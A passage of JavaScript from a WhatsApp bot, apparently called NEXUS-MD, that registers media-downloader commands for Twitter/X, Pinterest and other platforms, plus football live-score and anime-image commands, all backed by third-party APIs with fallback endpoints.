            `https://api.giftedtech.co.ke/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(ytUrl)}&quality=${quality}`
          );
          const giftedData = await giftedRes.json();

          let giftedVideo = giftedData.result?.download_url || giftedData.download_url || giftedData.url;
          if (giftedVideo) {
            const vRes = await fetch(giftedVideo);
            const vBuf = Buffer.from(await vRes.arrayBuffer());
            if (vBuf.length > 5000) {
              return await sock.sendMessage(from, {
                video: vBuf,
                mimetype: 'video/mp4',
                caption: `🎬 *${target.title}*\n\n✅ *YouTube Download (search fallback)*`
              });
            }
          }
        }
      } catch (ytErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Download Error: ${error.message || 'Could not download video.'}\n\n💡 Make sure the URL is valid and try again.` 
      });
    }
  }
});

register({
  name: 'twitter',
  aliases: ['x', 'xdl', 'twitterdl', 'tweet'],
  category: 'DOWNLOADER',
  description: 'Download Twitter/X Videos with quality selection',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🐦 *Twitter/X Downloader*\n\nUsage: ${prefix}${command} <url> [quality]\nExample: ${prefix}${command} https://twitter.com/elonmusk/status/1822355008559489216\n\n*Quality options:*\n• 720p (best)\n• 360p (default)\n• 270p (smallest)\n\n*Examples:*\n${prefix}${command} https://twitter.com/user/status/xxxxx 720p\n${prefix}${command} https://x.com/user/status/xxxxx 360p\n\n*Note:* Supports Twitter/X video posts.` 
      });
    }

    const url = args[0];
    let preferredQuality = '360p'; // Default quality

    // Check if user specified quality
    const qualityArg = (args[1] || '').toLowerCase();
    const validQualities = ['720p', '360p', '270p'];
    if (validQualities.includes(qualityArg)) {
      preferredQuality = qualityArg;
    }

    // Check URL format
    if (!url.includes('twitter.com') && !url.includes('x.com')) {
      return await sock.sendMessage(from, { 
        text: `❌ Invalid URL. Please provide a valid Twitter/X link.` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Processing Twitter/X media...` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/download/twitter?apikey=gifted&url=${encodeURIComponent(url)}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract video data
      let thumbnail = data.result?.thumbnail || null;
      let videoUrls = data.result?.videoUrls || [];

      if (!videoUrls || videoUrls.length === 0) {
        throw new Error("Could not extract video URLs from API response.");
      }

      // Find best quality matching user preference
      let selectedVideo = null;
      let selectedQuality = '';

      // Quality order from best to worst
      const qualityOrder = ['720p', '360p', '270p'];

      // First, try to match user's preferred quality
      for (const video of videoUrls) {
        if (video.quality === preferredQuality) {
          selectedVideo = video;
          selectedQuality = video.quality;
          break;
        }
      }

      // If not found, use the best available
      if (!selectedVideo) {
        for (const q of qualityOrder) {
          for (const video of videoUrls) {
            if (video.quality === q) {
              selectedVideo = video;
              selectedQuality = video.quality;
              break;
            }
          }
          if (selectedVideo) break;
        }
      }

      // If still no match, use the first one
      if (!selectedVideo) {
        selectedVideo = videoUrls[0];
        selectedQuality = selectedVideo.quality || 'Unknown';
      }

      const videoUrl = selectedVideo.url;

      // Send thumbnail if available
      if (thumbnail) {
        try {
          await sock.sendMessage(from, {
            image: { url: thumbnail },
            caption: `🐦 *Twitter/X Video*\n📊 *Quality:* ${selectedQuality}\n\n⬇️ *Downloading video...*`
          });
        } catch (thumbErr) {
          await sock.sendMessage(from, { 
            text: `🐦 *Twitter/X Video*\n📊 *Quality:* ${selectedQuality}\n\n⬇️ *Downloading video...*` 
          });
        }
      }

      // Download and send the video
      const videoResponse = await fetch(videoUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!videoResponse.ok) {
        throw new Error(`Video download failed: ${videoResponse.status}`);
      }

      const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());

      if (videoBuffer.length < 5000) {
        throw new Error("Downloaded file is too small. The link may be invalid.");
      }

      const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);

      // Build quality list
      let qualityList = '';
      videoUrls.forEach((video) => {
        const check = video.quality === selectedQuality ? '✅' : '•';
        qualityList += `${check} ${video.quality}\n`;
      });

      const caption = `🐦 *Twitter/X Video*\n📊 *Quality:* ${selectedQuality}\n📦 *Size:* ${fileSizeMB} MB\n\n📥 *Available Qualities:*\n${qualityList}\n\n✅ *Download Success*`;

      try {
        await sock.sendMessage(from, {
          video: videoBuffer,
          mimetype: 'video/mp4',
          caption: caption
        });
      } catch (sendErr) {
        await sock.sendMessage(from, {
          document: videoBuffer,
          mimetype: 'video/mp4',
          fileName: `twitter_${Date.now()}.mp4`,
          caption: `🐦 *Twitter/X Video*\n📊 *Quality:* ${selectedQuality}\n📦 *Size:* ${fileSizeMB} MB`
        });
      }

    } catch (error) {
      console.error('Twitter/X download error:', error);

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/download/twitter';
        const fallbackRes = await fetch(`${princeUrl}?apikey=prince&url=${encodeURIComponent(url)}`);
        const fallbackData = await fallbackRes.json();

        let fallbackVideo = fallbackData.result?.video || fallbackData.result?.download_url || 
                            fallbackData.video || fallbackData.download_url || fallbackData.url;
        let fallbackImages = fallbackData.result?.images || fallbackData.images || [];

        if (fallbackVideo) {
          const vRes = await fetch(fallbackVideo);
          const vBuf = Buffer.from(await vRes.arrayBuffer());
          if (vBuf.length > 5000) {
            return await sock.sendMessage(from, { 
              video: vBuf, 
              mimetype: 'video/mp4',
              caption: '✅ *Twitter/X Download (fallback)*' 
            });
          }
        }
        if (fallbackImages.length > 0) {
          for (const img of fallbackImages.slice(0, 3)) {
            if (img && img.startsWith('http')) {
              await sock.sendMessage(from, { image: { url: img } });
              await new Promise(r => setTimeout(r, 500));
            }
          }
          return;
        }
      } catch (fallbackErr) {}

      // Fallback: David Cyril API
      try {
        const davidUrl = 'https://apis.davidcyril.name.ng/download/twitterx';
        const davidRes = await fetch(`${davidUrl}?url=${encodeURIComponent(url)}`);
        const davidData = await davidRes.json();

        let davidVideo = davidData.result?.video || davidData.video || davidData.download_url || davidData.url;

        if (davidVideo) {
          const vRes = await fetch(davidVideo);
          const vBuf = Buffer.from(await vRes.arrayBuffer());
          if (vBuf.length > 5000) {
            return await sock.sendMessage(from, { 
              video: vBuf, 
              mimetype: 'video/mp4',
              caption: '✅ *Twitter/X Download (fallback)*' 
            });
          }
        }
      } catch (davidErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Download Error: ${error.message || 'Could not download media.'}\n\n💡 Make sure the URL is valid and the post contains a video.` 
      });
    }
  }
});
register({
  name: 'pinterest',
  aliases: ['pin', 'pins', 'pinvideo', 'pinterestdl'],
  category: 'DOWNLOADER',
  description: 'Search and download Pinterest videos',
  async execute({ sock, from, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a search query
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `📌 *Pinterest Video Search & Download*\n\nUsage: ${prefix}${command} <query>\nExample: ${prefix}${command} Naruto\n\n*Examples:*\n${prefix}${command} Anime\n${prefix}${command} Nature wallpaper\n${prefix}${command} Aesthetic\n${prefix}${command} Funny cats\n\n*Note:* Returns up to 10 video results with download links.` 
      });
    }

    const query = args.join(" ");

    await sock.sendMessage(from, { 
      text: `📌 *Searching Pinterest for:* ${query}` 
    });

    try {
      // ==========================================================
      // Call Pinterest Search API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/download/Pinterest`);
      apiUrl.searchParams.append('action', 'search');
      apiUrl.searchParams.append('query', query);

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Check if search was successful
      // ==========================================================
      if (!data.success) {
        return await sock.sendMessage(from, { 
          text: `❌ Search failed: ${data.message || 'Unknown error'}` 
        });
      }

      const videos = data.data?.videos || [];
      
      if (!videos.length) {
        return await sock.sendMessage(from, { 
          text: `❌ No videos found for "${query}".` 
        });
      }

      // ==========================================================
      // Send results (max 10)
      // ==========================================================
      const maxResults = Math.min(videos.length, 10);
      
      await sock.sendMessage(from, { 
        text: `📌 *Found ${videos.length} videos for "${query}"*\n📤 *Sending ${maxResults} results...*` 
      });

      for (let i = 0; i < maxResults; i++) {
        const video = videos[i];
        
        const title = video.title || 'Untitled';
        const description = video.description || 'No description';
        const videoUrl = video.video || '';
        const thumbnail = video.thumbnail || '';
        const link = video.link || '';
        const pinner = video.pinner || 'Unknown';
        const username = video.username || '';
        const likes = video.likes || 0;

        if (!videoUrl) continue;

        let msg = `📌 *${title}*\n`;
        msg += `👤 *Pinner:* ${pinner}${username ? ` (@${username})` : ''}\n`;
        msg += `❤️ *Likes:* ${likes.toLocaleString()}\n`;
        msg += `📝 *Description:* ${description.slice(0, 100)}${description.length > 100 ? '...' : ''}\n`;
        msg += `🔗 *Link:* ${link}\n\n`;
        msg += `⬇️ *Downloading video...*`;

        // Send thumbnail with info
        if (thumbnail) {
          try {
            await sock.sendMessage(from, {
              image: { url: thumbnail },
              caption: msg
            });
          } catch (thumbErr) {
            await sock.sendMessage(from, { text: msg });
          }
        } else {
          await sock.sendMessage(from, { text: msg });
        }

        // ==========================================================
        // Download and send the video
        // ==========================================================
        try {
          const videoResponse = await fetch(videoUrl, {
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
              'Referer': 'https://www.pinterest.com/'
            }
          });

          if (videoResponse.ok) {
            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
            
            if (videoBuffer.length > 5000) {
              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
              
              // If video is too large, send as document
              if (videoBuffer.length > 16 * 1024 * 1024) {
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: `pinterest_${Date.now()}.mp4`,
                  caption: `📌 *${title}*\n📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to 16MB limit.*`
                });
              } else {
                try {
                  await sock.sendMessage(from, {
                    video: videoBuffer,
                    mimetype: 'video/mp4',
                    caption: `📌 *${title}*\n❤️ ${likes} likes\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *Pinterest Download Success*`
                  });
                } catch (sendErr) {
                  // Fallback: send as document
                  await sock.sendMessage(from, {
                    document: videoBuffer,
                    mimetype: 'video/mp4',
                    fileName: `pinterest_${Date.now()}.mp4`,
                    caption: `📌 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
                  });
                }
              }
            }
          }
        } catch (dlErr) {
          console.warn(`Failed to download video ${i+1}:`, dlErr.message);
          await sock.sendMessage(from, { 
            text: `⚠️ Failed to download video ${i+1}. Skipping...` 
          });
        }

        // Small delay between videos
        await new Promise(r => setTimeout(r, 1000));
      }

      await sock.sendMessage(from, { 
        text: `✅ *Sent ${maxResults} videos from Pinterest.*\n💡 Use ${prefix}${command} <query> to search more.` 
      });

    } catch (error) {
      console.error('Pinterest error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not search Pinterest.'}\n\n💡 Try:\n• ${prefix}${command} Naruto\n• ${prefix}${command} Anime\n• ${prefix}${command} Nature\n\n💡 Or try again later.` 
      });
    }
  }
});

register({
  name: 'all',
  aliases: ['alldl', 'allmedia', 'downloadall'],
  category: 'DOWNLOADER',
  description: 'Download media from TikTok, Twitter, Facebook, Instagram, Pinterest, LinkedIn, Snapchat, Threads, Tumblr',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `📥 *Universal Media Downloader*\n\nUsage: ${prefix}${command} <url>\nExample: ${prefix}${command} https://www.tiktok.com/@user/video/xxxxx\n\n*Supported Platforms:*\n• TikTok\n• Twitter/X\n• Facebook\n• Instagram\n• Pinterest\n• LinkedIn\n• Snapchat\n• Threads\n• Tumblr\n\n*Note:* Automatically detects media type and sends accordingly.`
      });
    }

    const url = args[0];
    await sock.sendMessage(from, { text: `⏳ Processing media from URL...` });

    try {
      // ==========================================================
      // Primary: OmegaTech All-Downloader-V2
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const response = await fetch(
        `${baseUrl}/api/download/All-downloader-v2?url=${encodeURIComponent(url)}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Extract media URLs from response
      // ==========================================================
      let videoUrl = data.result?.video || data.result?.download_url || 
                     data.video || data.download_url || data.url;
      
      let imageUrls = data.result?.images || data.images || 
                      data.result?.urls || data.urls || [];
      
      let audioUrl = data.result?.audio || data.audio || 
                     data.result?.music || data.music;
      
      let title = data.result?.title || data.title || data.caption || 'Media';
      let author = data.result?.author || data.author || data.username || 'Unknown';
      let thumbnail = data.result?.thumbnail || data.thumbnail || data.cover || null;
      let duration = data.result?.duration || data.duration || 'N/A';
      let platform = data.result?.platform || data.platform || 'Unknown';

      // ==========================================================
      // Fallback: Search for any URL in the response
      // ==========================================================
      if (!videoUrl && !imageUrls.length && !audioUrl) {
        const jsonString = JSON.stringify(data);
        
        // Look for video URLs
        const videoMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mov|webm|mkv|avi)/i);
        if (videoMatch) videoUrl = videoMatch[0];
        
        // Look for audio URLs
        const audioMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp3|m4a|ogg|wav|aac)/i);
        if (audioMatch) audioUrl = audioMatch[0];
        
        // Look for image URLs
        const imageMatch = jsonString.match(/https?:\/\/[^\s"']+\.(jpg|jpeg|png|gif|webp)/gi);
        if (imageMatch && imageMatch.length) imageUrls = imageMatch;
      }

      if (!videoUrl && !imageUrls.length && !audioUrl) {
        throw new Error("Could not extract media from the provided URL.");
      }

      // ==========================================================
      // Send thumbnail if available
      // ==========================================================
      if (thumbnail) {
        try {
          await sock.sendMessage(from, {
            image: { url: thumbnail },
            caption: `📥 *${platform} Media*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n⏱️ *Duration:* ${duration}\n\n⬇️ *Downloading media...*`
          });
        } catch (thumbErr) {
          // Continue without thumbnail
        }
      }

      // ==========================================================
      // Send media
      // ==========================================================
      let sentCount = 0;

      // Send video if available
      if (videoUrl) {
        try {
          const videoResponse = await fetch(videoUrl, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (videoResponse.ok) {
            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
            if (videoBuffer.length > 5000) {
              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);

              // If video is too large, send as document
              if (videoBuffer.length > 16 * 1024 * 1024) {
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.mp4`,
                  caption: `📥 *${platform} Video*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to WhatsApp 16MB limit.*`
                });
              } else {
                await sock.sendMessage(from, {
                  video: videoBuffer,
                  mimetype: 'video/mp4',
                  caption: `📥 *${platform} Video*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success*`
                });
              }
              sentCount++;
            }
          }
        } catch (vidErr) {
          console.warn('Video download failed:', vidErr.message);
        }
      }

      // Send audio if available (and no video sent)
      if (audioUrl && sentCount === 0) {
        try {
          const audioResponse = await fetch(audioUrl, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (audioResponse.ok) {
            const audioBuffer = Buffer.from(await audioResponse.arrayBuffer());
            if (audioBuffer.length > 5000) {
              const fileSizeMB = (audioBuffer.length / 1024 / 1024).toFixed(1);
              await sock.sendMessage(from, {
                audio: audioBuffer,
                mimetype: 'audio/mpeg',
                fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.mp3`,
                caption: `🎵 *${platform} Audio*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success*`
              });
              sentCount++;
            }
          }
        } catch (audErr) {
          console.warn('Audio download failed:', audErr.message);
        }
      }

      // Send images if available
      if (imageUrls.length && sentCount === 0) {
        const maxImages = Math.min(imageUrls.length, 10);
        for (let i = 0; i < maxImages; i++) {
          try {
            const imgUrl = imageUrls[i];
            if (imgUrl && imgUrl.startsWith('http')) {
              const imgResponse = await fetch(imgUrl);
              if (imgResponse.ok) {
                const imgBuffer = Buffer.from(await imgResponse.arrayBuffer());
                if (imgBuffer.length > 1000) {
                  await sock.sendMessage(from, {
                    image: imgBuffer,
                    caption: i === 0 ? `📸 *${platform} Images*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n📷 ${i+1}/${maxImages}` : `📷 ${i+1}/${maxImages}`
                  });
                  sentCount++;
                  await new Promise(r => setTimeout(r, 500));
                }
              }
            }
          } catch (imgErr) {
            console.warn(`Image ${i+1} failed:`, imgErr.message);
          }
        }
      }

      if (sentCount === 0) {
        throw new Error("Failed to download any media from the provided URL.");
      }

    } catch (error) {
      console.error('Universal download error:', error);

      // ==========================================================
      // Fallback: Try platform-specific endpoints
      // ==========================================================
      const fallbackEndpoints = [
        { name: 'OmegaTech', url: `https://omegatech-api.dixonomega.tech/api/download/All-downloader-v2?url=${encodeURIComponent(url)}` },
        { name: 'Prince', url: `https://api.princetechn.com/api/download/all?apikey=prince&url=${encodeURIComponent(url)}` },
        { name: 'GiftedTech', url: `https://api.giftedtech.co.ke/api/download/media?apikey=gifted&url=${encodeURIComponent(url)}` }
      ];

      for (const endpoint of fallbackEndpoints) {
        try {
          const fallbackRes = await fetch(endpoint.url, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (fallbackRes.ok) {
            const fallbackData = await fallbackRes.json();
            let fallbackMedia = fallbackData.result?.url || fallbackData.result?.download_url || 
                               fallbackData.url || fallbackData.download_url || fallbackData.result;

            if (fallbackMedia && fallbackMedia.startsWith('http')) {
              const mediaRes = await fetch(fallbackMedia);
              const mediaBuf = Buffer.from(await mediaRes.arrayBuffer());
              if (mediaBuf.length > 5000) {
                await sock.sendMessage(from, {
                  video: mediaBuf,
                  mimetype: 'video/mp4',
                  caption: `📥 *Media (${endpoint.name} fallback)*\n\n✅ *Download Success*`
                });
                return;
              }
            }
          }
        } catch (fallbackErr) {
          console.warn(`${endpoint.name} fallback failed:`, fallbackErr.message);
        }
      }

      await sock.sendMessage(from, { 
        text: `⚠️ Download Error: ${error.message || 'Could not download media.'}\n\n💡 Make sure:\n• The URL is valid and public\n• The platform is supported\n• Try a direct video/link\n\n*Supported:* TikTok, Twitter, Facebook, Instagram, Pinterest, LinkedIn, Snapchat, Threads, Tumblr` 
      });
    }
  }
});

register({
  name: 'livescore',
  aliases: ['score', 'football', 'scores', 'livefootball'],
  category: 'INFO',
  description: 'Get live football scores and match updates',
  async execute({ sock, from, args, prefix, command }) {
    // Check if user wants to filter by league
    let filter = '';
    if (args[0]) {
      filter = args.join(' ').toLowerCase();
    }

    await sock.sendMessage(from, { text: `⏳ Fetching live scores...` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/football/livescore2?apikey=gifted`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract matches
      let matches = data.result?.matches || [];
      let totalMatches = data.result?.totalMatches || 0;

      if (!matches || matches.length === 0) {
        return await sock.sendMessage(from, { 
          text: `⚠️ No matches found right now.` 
        });
      }

      // Filter by league if specified
      if (filter) {
        matches = matches.filter(m => 
          m.league?.toLowerCase().includes(filter) ||
          m.homeTeam?.toLowerCase().includes(filter) ||
          m.awayTeam?.toLowerCase().includes(filter)
        );
      }

      if (matches.length === 0) {
        return await sock.sendMessage(from, { 
          text: `❌ No matches found for "${filter}".\n\n💡 Try a different filter or remove it.` 
        });
      }

      // Limit to 20 matches to avoid message overflow
      const maxMatches = Math.min(matches.length, 20);

      // Build the response
      let msg = `⚽ *LIVE SCORES*\n`;
      if (filter) msg += `📌 *Filter:* ${filter}\n`;
      msg += `📊 *Showing:* ${maxMatches}/${matches.length} matches\n\n`;

      matches.slice(0, maxMatches).forEach((match) => {
        const home = match.homeTeam || 'Unknown';
        const away = match.awayTeam || 'Unknown';
        const homeScore = match.homeScore || '0';
        const awayScore = match.awayScore || '0';
        const league = match.league || 'Unknown League';
        const status = match.status || 'Unknown';
        const startTime = match.startTime ? new Date(match.startTime).toLocaleString() : 'N/A';

        // Status emoji
        let statusEmoji = '⏳';
        if (status.toLowerCase().includes('full time') || status.toLowerCase().includes('ft')) {
          statusEmoji = '✅ FT';
        } else if (status.toLowerCase().includes('live') || status.toLowerCase().includes('in progress')) {
          statusEmoji = '🟢 LIVE';
        } else if (status.toLowerCase().includes('half time')) {
          statusEmoji = '⏸️ HT';
        } else if (status.toLowerCase().includes('scheduled')) {
          statusEmoji = '📅';
        }

        msg += `${statusEmoji} *${league}*\n`;
        msg += `🏠 ${home} ${homeScore} - ${awayScore} ${away}\n`;
        msg += `📅 ${startTime}\n\n`;
      });

      if (matches.length > 20) {
        msg += `\n*Showing 20 of ${matches.length} matches.*\n`;
        msg += `💡 Use ${prefix}${command} <league> to filter results.`;
      }

      // Send as text
      await sock.sendMessage(from, { text: msg });

    } catch (error) {
      console.error('Livescore error:', error);

      // Fallback: Try alternative endpoint
      try {
        const fallbackUrl = 'https://api.giftedtech.co.ke/api/football/livescore';
        const fallbackRes = await fetch(`${fallbackUrl}?apikey=gifted`);
        const fallbackData = await fallbackRes.json();

        let fallbackMatches = fallbackData.result?.matches || [];

        if (fallbackMatches.length > 0) {
          let msg = `⚽ *Live Scores (fallback)*\n\n`;
          fallbackMatches.slice(0, 15).forEach((match) => {
            const home = match.homeTeam || 'Unknown';
            const away = match.awayTeam || 'Unknown';
            const score = match.score || `${match.homeScore || 0} - ${match.awayScore || 0}`;
            const league = match.league || 'Unknown League';
            msg += `*${league}*\n${home} ${score} ${away}\n\n`;
          });
          return await sock.sendMessage(from, { text: msg });
        }
      } catch (fallbackErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Livescore Error: ${error.message || 'Could not fetch scores.'}\n\n💡 Try again later.` 
      });
    }
  }
});
register({
  name: 'neko',
  aliases: ['nekogirl', 'animecat', 'nekoai'],
  category: 'TOOLS',
  description: 'Get a random Neko anime girl image',
  async execute({ sock, from, prefix, command }) {
    await sock.sendMessage(from, { text: `⏳ Fetching a neko image...` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/anime/neko?apikey=gifted`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract image URL
      let imageUrl = data.result || data.url || data.image || data.data?.url || data.data?.result;

      if (!imageUrl) {
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(png|jpg|jpeg|gif|webp)/i);
        if (urlMatch) imageUrl = urlMatch[0];
      }

      if (!imageUrl) {
        throw new Error("Could not extract image URL from API response.");
      }

      // Send the image
      await sock.sendMessage(from, {
        image: { url: imageUrl },
        caption: `🐱 *Neko Girl*\n\n✨ _Powered by NEXUS-MD_`
      });

    } catch (error) {
      console.error('Neko error:', error);

      // Fallback: Waifu API (sfw/neko)
      try {
        const fallbackRes = await fetch('https://api.waifu.pics/sfw/neko');
        const fallbackData = await fallbackRes.json();

        if (fallbackData && fallbackData.url) {
          return await sock.sendMessage(from, {
            image: { url: fallbackData.url },
            caption: `🐱 *Neko Girl (fallback)*\n\n✨ _Powered by NEXUS-MD_`
          });
        }
      } catch (fallbackErr) {}

      // Fallback: Another anime API
      try {
        const anotherRes = await fetch('https://nekos.life/api/v2/img/neko');
        const anotherData = await anotherRes.json();

        if (anotherData && anotherData.url) {
          return await sock.sendMessage(from, {
            image: { url: anotherData.url },
            caption: `🐱 *Neko Girl (fallback)*\n\n✨ _Powered by NEXUS-MD_`
          });
        }
      } catch (anotherErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Neko Error: ${error.message || 'Could not fetch image.'}\n\n💡 Try again later.` 
      });
    }
  }
});
register({
  name: 'scores',
  aliases: ['livescore', 'football', 'matches', 'livefootball'],
  category: 'INFO',
  description: 'Fetch live football matches and scores',
  async execute({ sock, from, args, prefix, command }) {
    // Check if user wants to filter by league or team
    let filter = '';
    if (args[0]) {
      filter = args.join(' ').toLowerCase();
    }

    await sock.sendMessage(from, { text: `⏳ Fetching live football scores...` });

    try {
      // ==========================================================
      // Primary: OmegaTech API - /api/tools/scores
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const response = await fetch(`${baseUrl}/api/tools/scores`, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Extract matches from response
      // ==========================================================
      let matches = data.result?.matches || data.matches || data.data || [];
      let totalMatches = matches.length || data.total || data.count || 0;

      // Handle case where data might be an object with matches inside
      if (data.result && !Array.isArray(data.result)) {
        matches = data.result.matches || data.result.fixtures || data.result.data || [];
      }

      if (!matches || !Array.isArray(matches) || matches.length === 0) {
        return await sock.sendMessage(from, { 
          text: `⚽ No live matches found right now.\n\n💡 Check back later or try:\n${prefix}${command} premier league\n${prefix}${command} la liga\n${prefix}${command} champions league` 
        });
      }

      // ==========================================================
      // Apply filter if specified
      // ==========================================================
      if (filter) {
        const filtered = matches.filter(m => {
          const league = (m.league || m.competition || m.tournament || '').toLowerCase();
          const home = (m.homeTeam || m.home || m.team1 || '').toLowerCase();
          const away = (m.awayTeam || m.away || m.team2 || '').toLowerCase();
          return league.includes(filter) || home.includes(filter) || away.includes(filter);
        });
        
        if (filtered.length === 0) {
          return await sock.sendMessage(from, { 
            text: `❌ No matches found for "${filter}".\n\n💡 Try a different filter or remove it.\n\n*Examples:*\n${prefix}${command} premier league\n${prefix}${command} manchester\n${prefix}${command} champions` 
          });
        }
        matches = filtered;
        totalMatches = matches.length;
      }

      // ==========================================================
      // Limit to 20 matches to avoid message overflow
      // ==========================================================
      const maxMatches = Math.min(matches.length, 25);

      // ==========================================================
      // Build the response
      // ==========================================================
      let msg = `⚽ *LIVE FOOTBALL SCORES*\n`;
      if (filter) msg += `📌 *Filter:* ${filter}\n`;
      msg += `📊 *Showing:* ${maxMatches}/${matches.length} matches\n`;
      msg += `🕐 *Updated:* ${new Date().toLocaleString()}\n\n`;

      let matchCount = 0;
      for (const match of matches) {
        if (matchCount >= maxMatches) break;
        
        // Extract match data with fallbacks
        const home = match.homeTeam || match.home || match.team1 || 'Unknown';
        const away = match.awayTeam || match.away || match.team2 || 'Unknown';
        const homeScore = match.homeScore !== undefined ? match.homeScore : (match.score?.home || match.score1 || '?');
        const awayScore = match.awayScore !== undefined ? match.awayScore : (match.score?.away || match.score2 || '?');
        const league = match.league || match.competition || match.tournament || 'Unknown League';
        const status = match.status || match.matchStatus || match.time || 'Unknown';
        const startTime = match.startTime || match.kickoff || match.datetime || '';

        // Format time
        let timeDisplay = '';
        if (startTime) {
          try {
            const date = new Date(startTime);
            if (!isNaN(date)) {
              timeDisplay = date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
            }
          } catch (e) {}
        }

        // Status emoji
        let statusEmoji = '⏳';
        const statusLower = (status || '').toLowerCase();
        if (statusLower.includes('full time') || statusLower.includes('ft') || statusLower.includes('finished')) {
          statusEmoji = '✅ FT';
        } else if (statusLower.includes('live') || statusLower.includes('in progress') || statusLower.includes('playing')) {
          statusEmoji = '🟢 LIVE';
        } else if (statusLower.includes('half time') || statusLower.includes('ht')) {
          statusEmoji = '⏸️ HT';
        } else if (statusLower.includes('scheduled') || statusLower.includes('upcoming')) {
          statusEmoji = '📅';
        } else if (statusLower.includes('penalty') || statusLower.includes('pen')) {
          statusEmoji = '⚽ PEN';
        }

        // Format score display
        let scoreDisplay = `${homeScore} - ${awayScore}`;
        if (homeScore === '?' || awayScore === '?') {
          scoreDisplay = 'vs';
        }

        msg += `${statusEmoji} *${league}*\n`;
        msg += `🏠 ${home} ${scoreDisplay} ${away}\n`;
        if (timeDisplay) msg += `🕐 ${timeDisplay}`;
        if (status && !statusLower.includes('live')) msg += ` | ${status}`;
        msg += `\n\n`;

        matchCount++;
      }

      if (matches.length > 25) {
        msg += `\n*Showing 25 of ${matches.length} matches.*\n`;
        msg += `💡 Use ${prefix}${command} <league/team> to filter results.`;
      }

